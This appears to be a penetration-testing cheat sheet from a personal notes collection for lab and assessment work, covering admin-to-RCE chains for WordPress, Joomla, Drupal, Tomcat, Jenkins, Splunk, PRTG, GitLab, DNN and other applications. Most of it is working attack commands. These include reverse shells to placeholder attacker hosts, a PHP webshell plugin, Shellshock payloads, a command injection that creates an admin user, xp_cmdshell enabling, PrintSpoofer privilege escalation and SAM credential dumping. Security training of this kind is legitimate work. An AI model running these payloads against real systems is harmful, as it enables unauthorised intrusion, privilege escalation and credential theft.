# Common Applications, Command Appendix

Part of [[COMMAND APPENDIX]]. Version fingerprinting and admin-to-RCE patterns for enterprise applications commonly encountered in labs and assessments.

**Pattern for every app:** find the version string → `searchsploit <app> <version>` or check MSF → try default creds before touching CVEs → escalate from admin to RCE.

---

## Application Discovery — EyeWitness & Aquatone

```bash
# Build scope list and Nmap scan
sudo nmap STMIP -p 80,443,8000,8080,8180,8888,10000 --open -oA webDiscovery -iL scopeList

# EyeWitness — screenshots + HTML report + ew.db SQLite index
python3 EyeWitness.py --web -x ~/webDiscovery.xml -d output_folder

# Aquatone — alternative screenshotter, reads Nmap XML via pipe
cat webDiscovery.xml | aquatone -nmap
firefox aquatone_report.html
```

See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.1]].

#### Tags: #EyeWitness #Aquatone #WebDiscovery

---

## WordPress

```bash
# Full enumeration (plugins, themes, users, timthumbs)
wpscan --url http://blog.target.local --enumerate

# User enumeration only
wpscan --url http://blog.target.local --enumerate u

# Brute force via xmlrpc (faster + often less filtered than wp-login.php)
wpscan --password-attack xmlrpc -t 20 -U <user> -P /usr/share/wordlists/rockyou.txt --url http://blog.target.local

# Plugin version (no auth)
curl http://<target>/wp-content/plugins/<plugin-name>/readme.txt | grep "Stable tag"

# Directory listing check
curl http://<target>/wp-content/uploads/    # directory listing enabled? browse subdirs

# Plugin LFI (example: mail-masta, CVE-2016-10956)
curl -s 'http://<target>/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd'

# Admin-to-RCE: theme editor
# Appearance → Theme Editor → select theme → 404.php → inject reverse shell → trigger URL:
curl 'http://<target>/wp-content/themes/<theme>/404.php'

# Admin-to-RCE: plugin zip upload (bypasses the loopback-check that reverts theme edits)
mkdir /tmp/shell && cat > /tmp/shell/shell.php << 'EOF'
<?php
/*
Plugin Name: shell
*/
system($_GET['cmd']);
EOF
cd /tmp && zip -r shell.zip shell
# Plugins → Add New → Upload Plugin → Install → Activate
# Webshell fires on every page: http://<target>/?cmd=id
```

See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.2]], [[Web Applications#WordPress|existing WordPress entry]].

#### Tags: #WordPress #WPScan #XMLRPCBruteForce #PluginLFI

---

## Joomla

```bash
# Version from README.txt (always present on default installs)
curl -s http://<target>/README.txt | head -n 4
# Format: "Joomla! 3.10 version history" → 3.10.0

# Version exact: manifests file
curl -s http://<target>/administrator/manifests/files/joomla.xml | grep '<version>'

# Login brute force
git clone https://github.com/ajnik/joomla-bruteforce.git
python3 joomla-brute.py -u http://<target> -w /usr/share/wordlists/rockyou.txt -usr admin

# Admin-to-RCE: template editor
# Extensions → Templates → Templates → select theme → edit error.php → inject reverse shell
# Trigger: http://<target>/templates/<theme>/error.php
exec("/bin/bash -c 'bash -i >& /dev/tcp/PWNIP/PWNPO 0>&1'");
```

See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.3]].

#### Tags: #Joomla #JoomlaBruteForce #TemplateEditorRCE

---

## Drupal

```bash
# Version from CHANGELOG.txt
curl -s http://<target>/CHANGELOG.txt | grep -m1 "Drupal"
# Drupal 7.30, 2014-07-24

# Version on Drupal 8+
curl -s http://<target>/core/CHANGELOG.txt | grep -m1 "Drupal"

# Admin-to-RCE: PHP Filter module (Drupal 7 only, disabled by default)
# Extend → find PHP Filter → Enable
# Content → Add Content → Basic page → set Text Format to "PHP code"
# Body: <?php exec("/bin/bash -c 'bash -i > /dev/tcp/PWNIP/PWNPO 0>&1'"); ?>
# Click Save → reverse shell fires immediately
```

See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.4]].

#### Tags: #Drupal #PHPFilter #DrupalRCE

---

## Tomcat

```bash
# Version: error page, documentation link, or Nmap banner
curl http://<target>:8080/nonexistent   # check response body for version

# Manager login brute force (MSF)
msfconsole -q
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS <target>
set RPORT 8080        # or 8180
set VHOST <vhost>
set STOP_ON_SUCCESS true
exploit

# WAR-based RCE (via Tomcat Manager App)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=PWNIP LPORT=PWNPO -f war -o backup.war
# Upload: Manager App → WAR file to upload → Browse → Deploy
# Trigger: click the deployed app in the manager list
nc -nvlp PWNPO

# CGI injection — CVE-2019-0232 (Windows, Tomcat < 9.0.17)
# Fuzz for .bat CGI scripts
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://<target>:8080/cgi/FUZZ.bat
# URL-encode a command injection (& + path)
curl 'http://<target>:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe'
# MSF exploit
use exploit/windows/http/tomcat_cgi_cmdlineargs
set RHOSTS <target>
set TARGETURI /cgi/cmd.bat
set LHOST tun0
set FORCEEXPLOIT true
exploit
```

See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.5]], [[Shells & Payloads#Tomcat WAR|Shells & Payloads appendix]].

#### Tags: #Tomcat #TomcatRCE #WARDeploy #CVE20190232 #TomcatCGI

---

## Jenkins

```bash
# Version: bottom-right of any page after logging in (admin:admin default)

# Groovy Script Console RCE: Manage Jenkins → Script Console
# Paste:
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/PWNIP/PWNPO;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
# Start nc -nvlp PWNPO first, then click Run
```

See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.6]].

#### Tags: #Jenkins #GroovyRCE #ScriptConsole

---

## Splunk

```bash
# Version: Nmap banner on port 8000 (HTTPS), or login page title

# App-install RCE
git clone https://github.com/0xjpuff/reverse_shell_splunk.git
# Edit reverse_shell_splunk/bin/run.ps1: set PWNIP and PWNPO
cd reverse_shell_splunk && tar -cvzf ../updater.tar.gz .
nc -nvlp PWNPO
# Manage Apps → Install app from file → updater.tar.gz → Upload
# Shell fires as NT AUTHORITY\SYSTEM (Windows) or splunk user (Linux)
```

See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.7]].

#### Tags: #Splunk #SplunkRCE #AppInstall

---

## PRTG Network Monitor

```bash
# Version: Nmap banner on port 8080, or bottom-left of web UI
# Default creds: prtgadmin:Password123

# Notification Execute Program RCE:
# 1. Setup → Account Settings → Notifications → Add new notification
# 2. Check "Execute Program"
# 3. Program File: "Demo exe notification - outfile.ps1"
# 4. Parameter: test.txt; net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
# 5. Save → select notification → click bell (test) → user created
crackmapexec smb <target> -u prtgadm1 -p 'Pwn3d_by_PRTG!'
evil-winrm -i <target> -u prtgadm1 -p 'Pwn3d_by_PRTG!'
type C:\Users\Administrator\Desktop\flag.txt
```

See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.8]].

#### Tags: #PRTG #NotificationRCE #LocalAdminCreation

---

## GitLab

```bash
# Version: register account → navigate to /help

# User enumeration (GitLab 13.10.3)
searchsploit -m ruby/webapps/49821.sh
./49821.sh --url http://gitlab.target.local:8081 \
  --userlist /opt/useful/seclists/Usernames/cirt-default-usernames.txt | grep exists

# Credential hunting: Explore projects → check config files, commit messages for "password"

# Authenticated RCE (GitLab 13.10.2)
searchsploit -m ruby/webapps/49951.py
nc -nvlp 9001
python3 49951.py -t http://gitlab.target.local:8081 \
  -u <user> -p <pass> \
  -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc PWNIP 9001 >/tmp/f'
```

See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.10]].

#### Tags: #GitLab #GitLabRCE #GitLabUserEnum

---

## Shellshock (CGI)

```bash
# Fuzz for CGI scripts
gobuster dir -u http://<target>/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi

# Test (read /etc/passwd)
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://<target>/cgi-bin/access.cgi

# Reverse shell
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/PWNIP/PWNPO 0>&1' http://<target>/cgi-bin/access.cgi
```

Payload anatomy: `() { :; };` defines a dummy bash function. Bash re-evaluates exported function definitions from environment variables, the `;` after `}` injects a second command into that re-evaluation context.

See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.11]].

#### Tags: #Shellshock #CVE20146271 #CGI #BashInjection

---

## ColdFusion

```bash
# Discovery: port 8500 (HTTP) or 443 (HTTPS); Server Monitor on 5500

# Authenticated RCE (ColdFusion 8, CVE-2009-2265)
searchsploit -m 50057.py
# Edit: lhost=PWNIP, lport=PWNPO, rhost=STMIP, rport=8500
python3 50057.py
```

See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.13]], [[Arctic|Arctic box writeup]] (same ColdFusion 8 CVE).

#### Tags: #ColdFusion #ColdFusionRCE #CVE20092265

---

## IIS Tilde Enumeration

```bash
# IIS leaks 8.3 short filenames via HTTP status code differences
git clone https://github.com/irsdl/IIS-ShortName-Scanner.git
cd IIS-ShortName-Scanner/release/
java -jar iis_shortname_scanner.jar 0 5 http://<target>/
# Output example: TRANSF~1.ASP (first 6 chars of full name)

# Build wordlist from the 6-char prefix
egrep -R ^transf /usr/share/wordlists/ | sed 's/^[^:]*://' > /tmp/list.txt

# Brute force full filename
gobuster dir -u http://<target>/ -w /tmp/list.txt -x .aspx,.asp
```

See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.14]].

#### Tags: #IISTildeEnumeration #IIS #ShortNameScanner

---

## LDAP Authentication Bypass

```
# When a login form queries LDAP with user-supplied input, wildcard * matches any entry
Username: *
Password: *
# LDAP filter becomes: (&(uid=*)(password=*)) → matches first user → login succeeds
```

See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.15]].

#### Tags: #LDAP #LDAPBypass #WildcardAuth

---

## Web Mass Assignment

```bash
# Read source code to find the privileged parameter not shown in the UI form
scp root@<target>:/opt/asset-manager/app.py .   # or SSH + cat

# Look for: if user['active'] == True: (or similar flag)
# Submit the hidden parameter in the POST body alongside normal login fields
curl -X POST http://<target>/login -d 'username=test&password=test&active=1'
```

See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.16]].

#### Tags: #MassAssignment #ParameterPollution

---

## Applications Connecting to Services — gdb ODBC

```bash
gdb ./<binary>
# Inside gdb:
set disassembly-flavor intel
disas main                # find SQLDriverConnect call
b SQLDriverConnect         # set breakpoint
run                       # pause at breakpoint
# Read RDX register — it holds the full ODBC connection string:
# "DRIVER=...;SERVER=...;UID=SA;PWD=N0tS3cr3t!;"
```

See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.17]].

#### Tags: #GDB #ODBCCredentials #BinaryAnalysis

---

## Thick Client — .NET Credential Extraction

```bash
# dnSpy: drag .dll or .exe onto dnSpy → browse source → look for SQL connection strings
# Path: C:\inetpub\wwwroot\bin\*.dll or C:\ProgramData\*

# de4dot: deobfuscate .NET binaries before loading into dnSpy
# Drag dump/binary onto de4dot.exe → drag cleaned file onto dnSpy

# x64dbg memory dump workflow:
# Open binary → run to Exit Breakpoint → Memory Map → MAP with RW protection → Follow in Dump
# Dump Memory to File → drag onto de4dot → drag cleaned .bin onto dnSpy
```

See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.12]].

#### Tags: #ThickClient #dnSpy #de4dot #DotNET #HardcodedCredentials

---

## WebLogic

```bash
# Version: Nmap banner on port 7001 (T3 protocol)
nmap -A -p 7001 <target>

# MSF RCE
use multi/http/weblogic_admin_handle_rce
set RHOSTS <target>
set SRVHOST PWNIP
set LHOST PWNIP
exploit
```

See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.18]].

#### Tags: #WebLogic #OracleWebLogic #MSFExploit

---

## Nagios XI

```bash
# Version: login → bottom-left of dashboard

# Authenticated RCE (Nagios XI 5.7.X)
searchsploit -m php/webapps/49422.py
nc -nvlp PWNPO &
python3 49422.py http://<target> <user> '<pass>' PWNIP PWNPO &
# Shell as www-data → cat flag.txt
```

See [[09. Common Web Application Attacks#9.6. Attacking Common Applications|ACA.20]].

#### Tags: #NagiosXI #NagiosRCE #MonitoringRCE

---

---

## DNN / DotNetNuke

.NET CMS running on IIS/MSSQL. Common in enterprise environments. Admin panel at `/admin/`.

**Fingerprinting:**

```bash
# Default DNN install has /Documentation/ and /Portals/ directories
curl -sI http://TARGET/Documentation/
# DNN version often in /Portals/_default/default.css or page source comments
```

**Exploitation chain (admin creds required):**

```sql
-- Step 1: Enable xp_cmdshell via SQL Console (Admin → Settings → SQL Console)
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', '1'
RECONFIGURE

-- Test execution
xp_cmdshell 'whoami'
-- Returns: iis apppool\<apppool_name>
```

```
-- Step 2: Whitelist upload extensions
Admin → Extensions → File Extension Management → add: asp,aspx,exe,SAVE
```

```
-- Step 3: Upload webshell (newcmdasp.asp or similar ASP webshell)
Admin → File Management → Upload Files
Click uploaded file → webshell accessible at /Portals/0/<filename>
```

**Privilege escalation from IIS AppPool context:**

IIS AppPool identity typically has `SeImpersonatePrivilege`. Use PrintSpoofer or SweetPotato:

```powershell
# Upload PrintSpoofer64.exe and nc.exe via DNN File Manager first
# Then from webshell or PS reverse shell:
c:\DotNetNuke\Portals\0\PrintSpoofer64.exe -c "c:\DotNetNuke\Portals\0\nc.exe LHOST LPORT -e cmd"
```

**SAM dump from SYSTEM context:**

```cmd
cd c:\dotnetnuke\portals\0\
reg save HKLM\SYSTEM SYSTEM.SAVE
reg save HKLM\SECURITY SECURITY.SAVE
reg save HKLM\SAM SAM.SAVE
```

Download all three via DNN File Manager, then on Kali:

```bash
secretsdump.py LOCAL \
  -system SYSTEM.SAVE \
  -sam SAM.SAVE \
  -security SECURITY.SAVE
```

DefaultPassword field in secretsdump output contains DPAPI-protected auto-login credentials from the registry, often reveals another user's plaintext password.

**Credential source: NFS + web.config**

If the DNN installation is on a volume shared via NFS (check with `showmount -e TARGET`), the database credentials live at:

```
/SHARE/DNN/web.config → <username>Administrator</username> + <value>PASSWORD</value>
```

See [[27. Assembling the Pieces|AEN.7]] for the full chain example.

#### Tags: #DNN #DotNetNuke #CMS #xpCmdshell #PrintSpoofer #SeImpersonatePrivilege #SAMDump #IIS #HTBSupplementary

---

#### Overall Tags: #CommonApplications #AppFingerprint #AdminToRCE #CMS #EnterpriseApps #DNN
## External Resources

- [HackTricks - Windows and Linux Pentesting Index](https://hacktricks.wiki/en/index.html)
- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [RevShells](https://www.revshells.com/) for shell payload selection
- [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
- [ippsec.rocks](https://ippsec.rocks/) for technique walkthrough searches
